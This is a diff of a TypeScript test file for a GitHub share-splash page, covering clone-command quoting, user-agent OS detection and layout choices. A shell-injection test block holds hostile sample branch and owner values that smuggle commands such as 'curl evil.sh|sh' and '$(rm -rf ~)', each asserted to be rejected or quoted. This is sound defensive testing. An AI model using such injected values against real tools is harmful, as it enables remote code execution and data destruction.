@@ -1,6 +1,15 @@
 import { describe, expect, test } from 'bun:test';
 import { encodeShareUrl } from '@inkeep/open-knowledge-core';
-import { buildCustomSchemeUrl, buildSplashViewModel, SPLASH_DOWNLOAD_URL } from './share-splash.ts';
+import {
+  buildCloneCommand,
+  buildCustomSchemeUrl,
+  buildSplashViewModel,
+  classifySplashOs,
+  clipboardCopyOutcome,
+  SPLASH_DOWNLOAD_URL,
+  SPLASH_INSTALL_COMMAND,
+  splashCtaLayout,
+} from './share-splash.ts';
 
 function encodeV1(sharedUrl: string): string {
   return encodeShareUrl(sharedUrl);
@@ -55,6 +64,24 @@ describe('buildSplashViewModel', () => {
       customSchemeUrl: `openknowledge://share?url=${encodeURIComponent(treeUrl)}`,
       githubUrl: treeUrl,
     });
+  });
+
+  test('uses the path basename as the filename on a nested doc share', () => {
+    const blobUrl = 'https://github.com/inkeep/playbooks/blob/main/docs/architecture/auth.md';
+    const view = buildSplashViewModel(encodeV1(blobUrl));
+    expect(view.kind).toBe('ok');
+    if (view.kind === 'ok') {
+      expect(view.filename).toBe('auth.md');
+    }
+  });
+
+  test('falls back to the repo name as filename for a root-folder (repo/branch root) share', () => {
+    const treeUrl = 'https://github.com/inkeep/playbooks/tree/main';
+    const view = buildSplashViewModel(encodeV1(treeUrl));
+    expect(view.kind).toBe('ok');
+    if (view.kind === 'ok') {
+      expect(view.filename).toBe('playbooks');
+    }
   });
 
   test('decodes a repo/branch-root folder (empty tree path) and falls back to the repo name', () => {
@@ -227,6 +254,83 @@ describe('buildSplashViewModel', () => {
   });
 });
 
+describe('buildSplashViewModel — shell-injection guard', () => {
+  test('rejects a branch carrying a shell command separator', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/main%3Bcurl%20evil.sh%7Csh/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects a branch carrying a command substitution', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/%24(rm%20-rf%20~)/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects a branch carrying a newline', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/a%0Acurl%20evil/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects an owner carrying a shell metacharacter', () => {
+    const url = 'https://github.com/o%3Bevil/playbooks/blob/main/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects a repo carrying a backtick', () => {
+    const url = 'https://github.com/inkeep/re%60id%60po/blob/main/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects a leading-dash branch (option injection into ok clone)', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/-rf/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects the same injection on a tree (folder) share', () => {
+    const url = 'https://github.com/inkeep/playbooks/tree/main%3Bcurl%20evil';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('still accepts a legitimate slash-bearing branch (not over-rejecting)', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/release%2F1.2.3/readme.md';
+    const view = buildSplashViewModel(encodeV1(url));
+    expect(view.kind).toBe('ok');
+    if (view.kind === 'ok') {
+      expect(view.branch).toBe('release/1.2.3');
+      expect(buildCloneCommand(view)).toBe('ok clone inkeep/playbooks -b release/1.2.3');
+    }
+  });
+
+  test('accepts a valid ref outside the old allowlist (release+candidate) — no over-rejection', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/release%2Bcandidate/readme.md';
+    const view = buildSplashViewModel(encodeV1(url));
+    expect(view.kind).toBe('ok');
+    if (view.kind === 'ok') {
+      expect(view.branch).toBe('release+candidate');
+      expect(buildCloneCommand(view)).toBe('ok clone inkeep/playbooks -b release+candidate');
+    }
+  });
+
+  test('accepts a shell-unsafe but valid ref and quotes it at render', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/feat%3Bx/readme.md';
+    const view = buildSplashViewModel(encodeV1(url));
+    expect(view.kind).toBe('ok');
+    if (view.kind === 'ok') {
+      expect(view.branch).toBe('feat;x');
+      expect(buildCloneCommand(view)).toBe("ok clone inkeep/playbooks -b 'feat;x'");
+    }
+  });
+
+  test('still rejects a `:` refspec-injection branch (would rewrite local refs)', () => {
+    const url = 'https://github.com/inkeep/playbooks/blob/HEAD%3Arefs%2Fheads%2Fevil/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+
+  test('rejects `..` owner/repo segments (encoded) — no `ok clone ../..` rendering', () => {
+    const url = 'https://github.com/%2E%2E/%2E%2E/blob/main/readme.md';
+    expect(buildSplashViewModel(encodeV1(url)).kind).toBe('invalid');
+  });
+});
+
 describe('buildCustomSchemeUrl', () => {
   test('produces the openknowledge://share?url=... custom-scheme handoff URL', () => {
     const blobUrl = 'https://github.com/o/r/blob/main/file with space.md';
@@ -241,5 +345,198 @@ describe('SPLASH_DOWNLOAD_URL', () => {
     expect(SPLASH_DOWNLOAD_URL).toBe(
       'https://github.com/inkeep/open-knowledge/releases/latest/download/Open-Knowledge-arm64.dmg',
     );
+  });
+});
+
+describe('SPLASH_INSTALL_COMMAND', () => {
+  test('is the published CLI install command (global npm install)', () => {
+    expect(SPLASH_INSTALL_COMMAND).toBe('npm install -g @inkeep/open-knowledge');
+  });
+});
+
+describe('buildCloneCommand', () => {
+  test('emits `ok clone <owner>/<repo> -b <branch>` using owner/repo shorthand', () => {
+    expect(buildCloneCommand({ owner: 'inkeep', repo: 'playbooks', branch: 'main' })).toBe(
+      'ok clone inkeep/playbooks -b main',
+    );
+  });
+
+  test('always emits -b on a default branch (main) — CLI default-fallback covers a deleted ref', () => {
+    expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: 'main' })).toBe(
+      'ok clone o/r -b main',
+    );
+  });
+
+  test('always emits -b on master', () => {
+    expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: 'master' })).toBe(
+      'ok clone o/r -b master',
+    );
+  });
+
+  test('always emits -b on a feature branch', () => {
+    expect(buildCloneCommand({ owner: 'inkeep', repo: 'playbooks', branch: 'feat-x' })).toBe(
+      'ok clone inkeep/playbooks -b feat-x',
+    );
+  });
+
+  test('preserves a slash-bearing branch name verbatim (off-argv, not a URL)', () => {
+    expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: 'feat/share' })).toBe(
+      'ok clone o/r -b feat/share',
+    );
+  });
+
+  test('contains no `ok auth login` line — auth surfaces at clone-failure time', () => {
+    const cmd = buildCloneCommand({ owner: 'o', repo: 'r', branch: 'main' });
+    expect(cmd).not.toContain('ok auth login');
+  });
+
+  test('POSIX-single-quotes a shell-unsafe but valid ref so the pasted command is inert', () => {
+    expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: 'feat;x' })).toBe(
+      "ok clone o/r -b 'feat;x'",
+    );
+  });
+
+  test('renders a `+`-bearing ref unquoted (release+candidate)', () => {
+    expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: 'release+candidate' })).toBe(
+      'ok clone o/r -b release+candidate',
+    );
+  });
+
+  test('POSIX-single-quotes a branch containing a literal single quote', () => {
+    expect(buildCloneCommand({ owner: 'o', repo: 'r', branch: "feat'x" })).toBe(
+      "ok clone o/r -b 'feat'\\''x'",
+    );
+  });
+});
+
+describe('classifySplashOs', () => {
+  test('returns `unknown` for null / undefined / empty', () => {
+    expect(classifySplashOs(null)).toBe('unknown');
+    expect(classifySplashOs(undefined)).toBe('unknown');
+    expect(classifySplashOs('')).toBe('unknown');
+  });
+
+  test('classifies userAgentData.platform values', () => {
+    expect(classifySplashOs('macOS')).toBe('macos');
+    expect(classifySplashOs('Linux')).toBe('linux');
+    expect(classifySplashOs('Windows')).toBe('windows');
+    expect(classifySplashOs('Chrome OS')).toBe('linux');
+    expect(classifySplashOs('iOS')).toBe('unknown');
+    expect(classifySplashOs('Android')).toBe('unknown');
+    expect(classifySplashOs('Unknown')).toBe('unknown');
+  });
+
+  test('classifies macOS desktop UA strings', () => {
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+      ),
+    ).toBe('macos');
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      ),
+    ).toBe('macos');
+  });
+
+  test('classifies Linux X11 UA strings', () => {
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      ),
+    ).toBe('linux');
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
+      ),
+    ).toBe('linux');
+  });
+
+  test('classifies Windows UA strings', () => {
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      ),
+    ).toBe('windows');
+    expect(
+      classifySplashOs('Mozilla/5.0 (Windows NT 10.0; rv:120.0) Gecko/20100101 Firefox/120.0'),
+    ).toBe('windows');
+  });
+
+  test('classifies iPhone / iPad UAs as unknown (the trailing "Mac OS X" is a decoy)', () => {
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+      ),
+    ).toBe('unknown');
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+      ),
+    ).toBe('unknown');
+  });
+
+  test('classifies Android UAs as unknown (the leading "Linux" is a decoy)', () => {
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+      ),
+    ).toBe('unknown');
+  });
+
+  test('never reports architecture — frozen Intel-vs-AS UA still classifies as macos', () => {
+    expect(
+      classifySplashOs(
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
+      ),
+    ).toBe('macos');
+  });
+});
+
+describe('splashCtaLayout', () => {
+  test('macOS and unknown render the cluster floor with the CLI in a disclosure', () => {
+    for (const os of ['macos', 'unknown'] as const) {
+      expect(splashCtaLayout(os)).toEqual({
+        showWindowsNotice: false,
+        showCluster: true,
+        cliInline: false,
+        showStandaloneGithub: false,
+      });
+    }
+  });
+
+  test('Linux promotes the CLI inline, drops the cluster, and keeps a standalone GitHub link', () => {
+    expect(splashCtaLayout('linux')).toEqual({
+      showWindowsNotice: false,
+      showCluster: false,
+      cliInline: true,
+      showStandaloneGithub: true,
+    });
+  });
+
+  test('Windows shows the not-supported notice only', () => {
+    expect(splashCtaLayout('windows')).toEqual({
+      showWindowsNotice: true,
+      showCluster: false,
+      cliInline: false,
+      showStandaloneGithub: false,
+    });
+  });
+
+  test('every OS keeps a path to GitHub (regression guard for the Linux-drop bug)', () => {
+    for (const os of ['macos', 'linux', 'windows', 'unknown'] as const) {
+      const l = splashCtaLayout(os);
+      expect(l.showWindowsNotice || l.showCluster || l.showStandaloneGithub).toBe(true);
+    }
+  });
+});
+
+describe('clipboardCopyOutcome', () => {
+  test('maps success to the `copied` branch', () => {
+    expect(clipboardCopyOutcome(true)).toEqual({ kind: 'copied' });
+  });
+
+  test('maps failure to the `fallback-select` branch (never a silent no-op)', () => {
+    expect(clipboardCopyOutcome(false)).toEqual({ kind: 'fallback-select' });
   });
 });
